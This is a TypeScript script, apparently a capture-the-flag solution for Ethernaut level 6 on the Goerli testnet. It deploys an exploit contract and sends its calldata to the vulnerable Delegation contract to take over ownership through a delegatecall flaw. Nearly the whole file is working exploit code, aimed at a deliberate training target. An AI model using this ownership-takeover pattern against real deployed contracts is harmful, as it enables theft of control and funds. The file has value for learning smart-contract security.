import DelegationExploitJson from '../../../artifacts/contracts/level6/DelegationExploit.sol/DelegationExploit.json';
const ethers = require('ethers');
require ('dotenv').config ();

const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);
const privateKey: string = process.env.ACTOR_PRIVATE_KEY as string;
const delegationContractAddress: string = '0xe4199c45b5B86eC22Fc6Df2963Ee4b6ccA3021d7';

// Define all function calls used
async function main(){
  console.log(`Ethernaut level 6 - script made by JoVi\n ------ `);
  const wallet = await new ethers.Wallet( privateKey, provider);
  const signer = wallet.connect(provider);
  const delegationExploitContractInterface = new ethers.ContractFactory(DelegationExploitJson.abi, DelegationExploitJson.bytecode, signer);

  console.log(`Deploying exploit contract\n ------`);
  const delegationExploitContract = await delegationExploitContractInterface.deploy();
  console.log(`Succesfully deployed\n ------ `);
  console.log(`...`);
  
  console.log(`Attempting to claim ownership.\n ------ `);
  const dataToPass = await delegationExploitContract.delegationHackBytes();
  const claimOwnerShipTx = {
    to: delegationContractAddress,
    data: dataToPass,
    gasLimit: 500000,
    
}

  // Send a transaction
  wallet.sendTransaction(claimOwnerShipTx)
  .then((txObj) => {
    
      console.log(`Transaction ${txObj.hash} pushed.\n ------ `);
      
  })

  
  





  
}


// Execute
main();